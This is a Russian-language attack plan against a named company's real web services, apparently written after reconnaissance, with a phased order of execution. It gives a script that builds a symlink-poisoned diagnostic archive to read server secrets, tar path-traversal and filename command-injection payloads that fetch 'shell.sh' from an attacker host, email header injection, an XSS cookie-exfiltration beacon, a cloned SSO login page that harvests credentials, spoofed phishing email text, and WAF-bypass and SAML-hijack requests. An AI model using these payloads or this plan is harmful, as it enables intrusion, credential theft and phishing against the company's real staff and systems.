# Jet Infosystems — Нестандартные векторы атаки

**Статус:** Разведка завершена (3 волны, 0 детектов)  
**Принцип:** Не ломать двери — найти окна, которых не видят

---

## Философия

Jet CSIRT — 70+ экспертов (CISSP, OSCP, CEH). Они ждут:
- Port scan → заблокируют IP
- Brute-force OWA → lockout + алерт
- SQLi/XSS сканер → WAF + SOC alert
- Стандартный ProxyShell → уже пропатчено (CU23)

**Мы не будем делать ничего из этого.**

---

## Вектор α: «Троянский конь» — отравление парсера через sosreport

### Суть

Парсер tools.jet.su **анонимно** принимает файлы через `/api/` и **распаковывает** архивы (tar, tar.gz, zip, rar). Он ожидает sosreport/explorer/snap — диагностические дампы серверов.

Парсер **сам** вызывает распаковку и обработку. Мы не атакуем — мы **заставляем их систему атаковать себя**.

### Подвектор α1: Symlink Poisoning (чтение произвольных файлов)

sosreport содержит `/etc/passwd`, `/var/log/messages` и т.д. Парсер **ожидает** эти пути. Мы создаём архив где:

```
sosreport/
├── etc/
│   ├── passwd          → SYMLINK → /etc/passwd (РЕАЛЬНЫЙ на сервере)
│   ├── nginx/
│   │   └── nginx.conf  → SYMLINK → /etc/nginx/nginx.conf
│   ├── shadow          → SYMLINK → /etc/shadow
│   └── django_settings → SYMLINK → /srv/files/settings.py (или /app/settings.py)
├── var/
│   └── log/
│       └── messages    → SYMLINK → /var/log/nginx/access.log
└── hostname            → обычный файл "sosreport-server001"
```

Парсер распакует → пойдёт по симлинкам → прочитает реальные файлы сервера → **включит их содержимое в отчёт** → отправит отчёт на email.

**Ключевая хитрость:** Мы не знаем email получателя. Но из JS-кода:
```javascript
var username = document.getElementById("username").dataset['username']
```
Отчёт уходит владельцу файла. Для анонимного upload — возможно, на адрес по умолчанию (admin? postmaster?).

**Выход:** Результат парсинга (с нашими симлинками) отправляется кому-то внутри Jet. Нам нужно перехватить этот отчёт. Как?

### Подвектор α2: Callback через DNS (Out-of-Band exfiltration)

Вместо symlink → создать sosreport с файлами, которые содержат callback-адреса:

```
# /etc/resolv.conf внутри sosreport
nameserver 8.8.8.8
nameserver evil-dns-server.attacker.com
```

Или лучше — если парсер обрабатывает сетевые конфиги и пытается резолвить хосты:

```
# /etc/hosts внутри sosreport
10.0.0.1   dc01.jetinf.local
10.0.0.2   exfil-callback.attacker.com
```

Если парсер валидирует/резолвит адреса из конфигов — получаем DNS callback.

### Подвектор α3: Archive-based Code Injection

Парсер — Python (Django). Вероятно использует:
- `tarfile.extractall()` — уязвим к path traversal (CVE-2007-4559)
- `zipfile.extractall()` — уязвим к zip slip
- `subprocess.call(['tar', 'xzf', ...])` — если через shell=True, command injection

**Crafted tar с path traversal:**
```
../../../tmp/evil.py                    → Python reverse shell
../../../etc/cron.d/backdoor            → Cron job
../../../srv/files/templates/base.html  → Overwrite Django template → XSS/SSTI
```

**Crafted filename с command injection:**
```
sosreport/etc/passwd; curl http://attacker.com/shell.sh | bash #.txt
```
Если парсер использует `os.system()` или `subprocess` с shell=True для обработки имён файлов.

### Подвектор α4: Python Pickle Deserialization

Если парсер кэширует результаты через pickle (Django cache backend):
- Создать файл внутри архива с pickle payload
- При десериализации → RCE

### Почему этот вектор нестандартный

1. **Мы не атакуем напрямую** — мы загружаем файл (легитимное действие) и просим парсер его обработать (тоже легитимное)
2. **Парсер сам выполняет всё опасное** — распаковка, чтение, обработка
3. **SOC не увидит атаку** — это выглядит как обычный upload+parse, нет сигнатур WAF
4. **Даже если файл заблокирован** — мы узнаем об этом из response (200 vs error) и адаптируемся

---

## Вектор β: «Отравленное письмо» — Email Header Injection через task_id

### Суть

Поле `task_id` валидируется **только на клиенте** (JavaScript regex: `^TASK[0-9]{5,8}`). Сервер может принимать что угодно.

Парсер отправляет отчёт по email. Если task_id попадает в тему письма или тело:

```
task_id=TASK00000001%0d%0aBcc: attacker@protonmail.com
```

Или через Content-Type manipulation:
```
task_id=TASK00000001%0d%0aContent-Type: multipart/mixed%0d%0a--boundary%0d%0a...
```

### Сценарий

1. Upload файл с sosreport содержащий `/etc/passwd` через symlink
2. Dispatch на парсер с отравленным task_id
3. Парсер распакует, прочитает реальные файлы, сформирует отчёт
4. Email с отчётом уйдёт на @jet.su **И** на наш адрес через Bcc injection
5. Мы получаем содержимое серверных файлов в отчёте

### Почему это работает

- Сервер Django, email через `django.core.mail` — если task_id подставляется через string format без санитизации, header injection возможна
- Валидация task_id — client-side only
- Даже если Bcc не сработает — можно попробовать injection в Subject (информация)

---

## Вектор γ: «Кража ключей» — Django SECRET_KEY через Error Exploitation

### Суть

`/file/update/{sn}` возвращает 500 Server Error. Сервер крашится **без проверки авторизации**. Значит код доходит до бизнес-логики и падает.

### Стратегия

Django в debug-режиме (DEBUG=True) показывает полный stack trace включая:
- **settings.py** со всеми переменными (включая SECRET_KEY)
- Traceback с путями файлов
- Переменные окружения
- SQL-запросы

Мы знаем что DEBUG может быть True потому что:
- HTML-комментарий `<!-- TODO: Django messages -->` — разработчики не чистят
- Bootstrap 3.0.3 + jQuery 1.10.2 — древние версии, app возможно не обновляется
- 500 без graceful handling — нет кастомной страницы ошибок (только `<h1>Server Error (500)</h1>`)

**НО:** `<h1>Server Error (500)</h1>` — это Django DEFAULT 500 page когда `DEBUG=False`. Значит DEBUG отключен в production.

### Альтернативный путь к SECRET_KEY

1. **Через подписанный cookie:** Django messages cookie содержит HMAC:
   ```
   messages="23780ac744a35e476b926d90f816886202b315da$[...]"
   ```
   Первая часть — HMAC-SHA1 подпись. Если мы можем контролировать payload (через загрузку файлов с определёнными описаниями) → known-plaintext attack на SECRET_KEY

2. **Через timing attack на HMAC:** Если сервер сравнивает подпись побайтово (не constant-time), можно определить SECRET_KEY по времени ответа

3. **Если получим SECRET_KEY:**
   - Подделать sessionid cookie → авторизоваться как admin
   - Подделать messages cookie → SSTI через Django messages framework
   - Подписать произвольные данные для любого Django-приложения на этом сервере

---

## Вектор δ: «Подмена реальности» — Blitz SSO SAML Manipulation

### Суть

Exchange OWA использует Blitz SSO через SAML:
```
Location: https://blitz.jet.su/blitz/saml/profile/WSF-PRP/WSIGNIN/GET
  ?wa=wsignin1.0
  &wtrealm=https://autodiscover.jet.su/owa/
  &wctx=rm=0&id=passive&ru=/owa/
  &wct=2026-02-18T10:38:23Z
```

### Атаки на SAML

1. **wtrealm manipulation:** Заменить wtrealm на наш сервер:
   ```
   wtrealm=https://evil-server.com/capture
   ```
   Если Blitz не проверяет whitelist → SAML Response (с токеном пользователя) уйдёт к нам

2. **SAML Response Replay:** Если нет nonce/timestamp validation → перехваченный SAML response можно переиграть

3. **XML Signature Wrapping (XSW):** Классическая SAML-уязвимость — подпись проверяется на одном XML-узле, а assertion берётся из другого

4. **wctx parameter injection:**
   ```
   wctx=rm=0&id=passive&ru=/owa/../../EWS/Exchange.asmx
   ```
   Если после аутентификации происходит redirect по `ru` параметру без валидации → обход WAF-правила на EWS

### Самый хитрый подвектор

OWA login page (`/owa/auth/logon.aspx`) доступна **напрямую** без SSO. Но штатный redirect идёт на Blitz.

**Вопрос:** если отправить POST на `/owa/auth/logon.aspx` напрямую — примет ли Exchange credentials без Blitz? Конфигурация может быть: "redirect на SSO, но прямой логин тоже работает" — классическая ошибка dual-auth.

---

## Вектор ε: «Кротовая нора» — Timestamp-based Session Prediction на kuberbox

### Суть

Session cookies kuberbox содержат паттерн:
```
189550cbc902bbb... (запрос 1)
189550dbdf138b9... (запрос 2)
189550dc1d3a368... (запрос 3)
189550dc5cb0d30... (запрос 4)
```

Первые 6 hex символов (`189550`) — **общий префикс**. Это похоже на timestamp в hex (миллисекунды Unix epoch). `0x189550` ≈ соответствует дате из 2026.

### Атака

1. Определить точный формат timestamp в cookie
2. Вычислить временное окно когда администратор/сотрудник заходит на kuberbox (рабочие часы MSK: 09:00-18:00)
3. Предсказать valid session cookie → перебрать варианты в рамках временного окна
4. Cookie без HttpOnly + без SameSite → можно использовать через CSRF

### Усиление

Если одновременно получим XSS на files.jet.su (CSP: `unsafe-inline`):
- Загрузить HTML-файл через анонимный upload
- HTML содержит JS который крадёт cookie с kuberbox (same parent domain *.jet.su)
- Отправить ссылку `https://files.jet.su/d/xxxxx` сотруднику Jet

---

## Вектор ζ: «Зеркальный мир» — Stored XSS → Cookie Theft цепочка

### Суть

CSP на files.jet.su:
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```

**`unsafe-inline` = XSS без ограничений**

### Цепочка

**Шаг 1:** Загрузить HTML-файл через анонимный upload:
```html
<html>
<body>
<h1>Jet Security Report - Q1 2026</h1>
<p>Загрузка отчёта...</p>
<script>
// Собираем все cookies (kuberbox без HttpOnly!)
var cookies = document.cookie;
// Отправляем на наш сервер через Image beacon
new Image().src = 'https://attacker.com/c?d=' + 
    encodeURIComponent(document.domain) + '&c=' + 
    encodeURIComponent(cookies);

// Или через DNS exfiltration (без сетевых запросов в логах):
var encoded = btoa(cookies).replace(/=/g,'').substring(0,60);
new Image().src = 'https://' + encoded + '.exfil.attacker.com/px.gif';
</script>
</body>
</html>
```

**Шаг 2:** Получить short_name загруженного файла: `https://files.jet.su/d/xxxxxxxx`

**Шаг 3:** Отправить ссылку сотруднику Jet:
- Через Telegram-группу Network Scream (`t.me/+C6ww06FDVt1mMmU6`)
- Через SPF chain фишинг (send-box.ru → от @jet.su)
- Через description поле в загруженном файле (если отображается залогиненным пользователям)

**Шаг 4:** Сотрудник открывает → JS выполняется → cookies утекают

**Шаг 5:** С украденной session-cookie kuberbox → доступ к Kubernetes

### Проблема

Файлы на `/d/{sn}` требуют авторизации для скачивания (302 → login). Значит:
- Либо HTML не отрендерится (будет скачан как файл)
- Либо нужно найти другой путь инъекции

### Обход

- Проверить: может description поля отображается в UI без санитизации?
- Может filename отображается и уязвим к XSS через имя файла?
- task_id с HTML-тегами → отображается в email отчёте (HTML email)?

---

## Вектор η: «Социальная инженерия 2.0» — Фишинг с легитимного домена

### Суть

Файл загруженный на files.jet.su имеет адрес:
```
https://files.jet.su/d/xxxxxxxx
```

Это **доверенный домен Jet**. Внутренний корпоративный файлообменник.

### Цепочка

1. **Telegram OSINT:** Вступить в t.me/+C6ww06FDVt1mMmU6, собрать имена
2. **Crafted HTML-страница** маскирующаяся под SSO-логин:

```html
<html>
<head><title>Blitz Identity Provider - Авторизация</title></head>
<body style="background:#f5f5f5;font-family:Segoe UI,sans-serif;">
<div style="max-width:400px;margin:100px auto;background:white;padding:40px;
            box-shadow:0 2px 10px rgba(0,0,0,0.1);border-radius:4px;">
  <h2 style="color:#333;text-align:center;">Blitz SSO</h2>
  <p style="color:#666;">Для доступа к файлу требуется авторизация</p>
  <form action="https://attacker.com/harvest" method="POST">
    <input type="text" name="user" placeholder="username@jet.su" 
           style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;">
    <input type="password" name="pass" placeholder="Пароль"
           style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;">
    <button type="submit" 
            style="width:100%;padding:10px;background:#0072C6;color:white;
                   border:none;cursor:pointer;">Войти</button>
  </form>
</div>
</body>
</html>
```

3. **Upload** на files.jet.su → получить `https://files.jet.su/d/xxxxxxxx`

4. **SPF chain email** (от @jet.su через send-box.ru):
```
От: security@jet.su
Тема: [Urgent] Результаты аудита безопасности - требуется проверка
Тело: Коллеги, отчёт по результатам аудита доступен по ссылке:
      https://files.jet.su/d/xxxxxxxx
```

5. Сотрудник открывает **ссылку на своём же домене** → видит "логин" → вводит credentials

### Почему это работает

- URL на `files.jet.su` — доверенный домен
- Email от `@jet.su` — проходит SPF (через send-box.ru включённый в SPF)
- Форма выглядит как Blitz SSO (мы знаем точный дизайн из /owa/ redirect)
- SOC не увидит вредоносного URL — это их собственный домен

---

## Вектор θ: «Обратная сторона WAF» — Exchange WAF Bypass через verb/path tricks

### Суть

WAF блокирует `/EWS/`, `/rpc/`, `/autodiscover/autodiscover.xml` → 403. Но OWA доступен. WAF правила наверняка regex-based.

### Техники обхода

```
# 1. Path normalization 
/owa/../EWS/Exchange.asmx
/owa/..%2fEWS/Exchange.asmx
/owa/%2e%2e/EWS/Exchange.asmx

# 2. Case manipulation (IIS case-insensitive)
/Ews/exchange.asmx
/eWs/Exchange.ASMX
/EWS/exchange.ASMX

# 3. Double encoding
/%45%57%53/Exchange.asmx
/EWS%2fExchange.asmx

# 4. Trailing characters (IIS ignores)
/EWS/Exchange.asmx.
/EWS/Exchange.asmx/
/EWS/Exchange.asmx%20
/EWS/Exchange.asmx%00

# 5. Unicode normalization
/E%ef%bc%b7S/Exchange.asmx  (fullwidth W)

# 6. HTTP verb tampering 
# WAF может проверять только GET/POST
OPTIONS /EWS/Exchange.asmx
PROPFIND /EWS/Exchange.asmx

# 7. X-Original-URL / X-Rewrite-URL (nginx/IIS tricks)
GET / HTTP/1.1
X-Original-URL: /EWS/Exchange.asmx
X-Rewrite-URL: /EWS/Exchange.asmx

# 8. Host header manipulation
GET /EWS/Exchange.asmx HTTP/1.1
Host: localhost
# или
Host: MS-EX01
# (внутренний hostname — WAF может пропустить internal requests)

# 9. Через OWA endpoint (уже разрешён)
POST /owa/ HTTP/1.1
# с SSRF payload в body, если OWA имеет server-side request функцию

# 10. NTLM через OWA auth (не через /rpc/)
# OWA logon.aspx может поддерживать NTLM negotiate
Authorization: Negotiate TlRMTVNTUAABAAAA...
# → NTLM challenge → раскрывает внутренний домен, FQDN сервера
```

### Самый хитрый трюк

**ProxyShell через wctx redirect:**
```
https://blitz.jet.su/blitz/saml/profile/WSF-PRP/WSIGNIN/GET
  ?wa=wsignin1.0
  &wtrealm=https://autodiscover.jet.su/owa/
  &wctx=rm=0&id=passive&ru=/autodiscover/autodiscover.xml
```

Если после SAML auth redirect идёт на `ru=/autodiscover/autodiscover.xml` — мы аутентифицированы и WAF может пропустить (authenticated requests vs unauthenticated).

---

## Вектор ι: «GitLab за кулисами» — Нестандартное обнаружение idm.jet.su

### Суть

idm.jet.su = GitLab за reverse proxy. Все стандартные пути → кастомная 404. Значит proxy фильтрует по whitelist путей.

### Нестандартные пути GitLab

```
# GraphQL (часто забывают заблокировать)
/-/graphql
/-/graphql/explorer

# Internal API 
/-/health
/-/readiness
/-/liveness
/-/metrics

# Snippet (может быть публичным)
/-/snippets
/snippets/public

# User enumeration через забытые endpoints
/-/autocomplete/users.json?search=admin
/-/autocomplete/projects.json

# GitLab Pages (отдельный vhost)
# Может быть на pages.idm.jet.su или idm.jet.su:8090

# Raw file access (если есть публичные проекты)
/api/v4/projects?per_page=100&visibility=public

# Container Registry
/v2/
/jwt/auth

# GitLab CI artifacts
/-/artifacts/

# RSS/Atom feeds (часто без auth)
/dashboard/projects.atom
/groups.atom
```

### Хитрый подход

Не стучаться по путям (заблокировано), а использовать **боковые каналы**:

1. **Git clone по SSH:** Если порт 22 открыт на .78, `git clone git@idm.jet.su:NAMESPACE/REPO.git` — можно энумерировать namespaces/repos по ошибкам
2. **Container Registry:** GitLab registry обычно на порту 5050 — отдельный от веб
3. **GitLab Pages:** Отдельный сервис, может быть на другом порту/домене

---

## Вектор κ: «Тихая рекогносцировка» — Пассивный OSINT без единого запроса

### Ещё не использованные источники

1. **GitHub/GitLab.com поиск:**
   ```
   "jet.su" OR "jetinf" OR "jet.msk.su" password OR secret OR key OR token
   "@jet.su" filename:.env
   "@jet.su" filename:wp-config.php
   "jet.su" filename:.htpasswd
   ```

2. **Google Dorks:**
   ```
   site:jet.su filetype:sql
   site:jet.su inurl:admin
   site:jet.su "index of /"
   site:jet.su ext:bak OR ext:old OR ext:backup
   intext:"@jet.su" "password" OR "пароль"
   ```

3. **Wayback Machine:**
   ```
   web.archive.org/web/*/files.jet.su/*
   web.archive.org/web/*/idm.jet.su/*
   ```
   Старые версии сайтов могли иметь DEBUG=True или раскрывать API ключи

4. **Pastebin/Ghostbin:**
   ```
   Поиск: "jet.su" site:pastebin.com
   ```

5. **LinkedIn/HH.ru для username harvesting:**
   ```
   "Инфосистемы Джет" site:linkedin.com
   "Инфосистемы Джет" site:hh.ru
   ```
   Получить имена → сгенерировать username: a.ivanov, ivanov.a, ivanova

6. **DNS History:**
   ```
   SecurityTrails, DNSDumpster — исторические записи
   Могут раскрыть старые IP, бывшие поддомены, staging-серверы
   ```

---

## Приоритизация

| # | Вектор | Сложность | Шанс успеха | Шум | Reward |
|---|--------|-----------|-------------|-----|--------|
| α | Парсер sosreport (symlink + path traversal) | Средняя | ВЫСОКИЙ | Минимальный | RCE на .219 |
| β | Email injection через task_id | Низкая | Средний | Нулевой | Exfiltration |
| η | Фишинг с files.jet.su (SPF chain) | Средняя | ВЫСОКИЙ | Минимальный | Credentials |
| θ | Exchange WAF bypass | Высокая | Средний | Средний | Exchange RCE |
| δ | SAML wtrealm manipulation | Средняя | Средний | Низкий | Token theft |
| ε | Timestamp session prediction | Высокая | Низкий | Нулевой | K8s access |
| ζ | Stored XSS цепочка | Средняя | Средний | Низкий | Cookie theft |
| γ | SECRET_KEY extraction | Высокая | Низкий | Средний | Full access |
| ι | GitLab боковые каналы | Средняя | Средний | Низкий | Source code |
| κ | Пассивный OSINT | Низкая | Средний | НУЛЕВОЙ | Intel |

---

## Рекомендованный порядок

### Фаза 0 (сейчас, 0 запросов): Вектор κ
Пассивный OSINT — GitHub dorks, Google, Wayback, LinkedIn. Ноль шума.

### Фаза 1 (1-3 запроса): Вектор α + β
Один upload crafted sosreport + один dispatch на парсер + проверка task_id injection.
Выглядит как легитимное использование сервиса.

### Фаза 2 (по результатам): Вектор η или δ
Если Phase 1 даст credentials/RCE → pivot.
Если нет → фишинг с доверенного домена или SAML manipulation.

### Фаза 3 (escalation): Вектор θ
Exchange WAF bypass — только если есть credentials из Phase 2.

---

## Подготовка crafted sosreport (для Фазы 1)

### Требования
- Структура должна выглядеть как настоящий sosreport
- Symlinks на целевые файлы сервера
- Имена файлов с потенциальным command injection
- Нужно создавать на Linux (Windows не поддерживает symlinks в tar правильно)

### Целевые файлы для чтения через symlinks
```
/etc/passwd                          → список пользователей
/etc/shadow                          → хэши паролей (если прав хватит)
/etc/nginx/nginx.conf                → конфиг nginx (vhosts, upstream)
/etc/nginx/sites-enabled/default     → конфиг Django app
/proc/self/environ                   → env переменные (SECRET_KEY, DB password)
/proc/self/cmdline                   → как запущен процесс
/srv/files/settings.py               → Django settings (предполагаемый путь)
/app/settings.py                     → альтернативный путь
/opt/files/settings.py               → ещё вариант
/home/files/.env                     → .env файл
/var/www/files/settings.py           → ещё вариант
```

### Скрипт создания (Linux)
```bash
#!/bin/bash
mkdir -p sosreport-server001/etc/sysconfig
mkdir -p sosreport-server001/var/log
mkdir -p sosreport-server001/proc/self

# Легитимные файлы (маскировка)
echo "CentOS release 7.9.2009 (Core)" > sosreport-server001/etc/redhat-release
echo "server001.example.com" > sosreport-server001/hostname
echo "NETWORKING=yes" > sosreport-server001/etc/sysconfig/network
date > sosreport-server001/date

# Symlinks на реальные файлы сервера
ln -sf /etc/passwd sosreport-server001/etc/passwd
ln -sf /etc/nginx/nginx.conf sosreport-server001/etc/nginx.conf
ln -sf /proc/self/environ sosreport-server001/proc/self/environ
ln -sf /proc/self/cmdline sosreport-server001/proc/self/cmdline

# Tar с сохранением symlinks
tar czf sosreport-server001.tar.gz sosreport-server001/
```
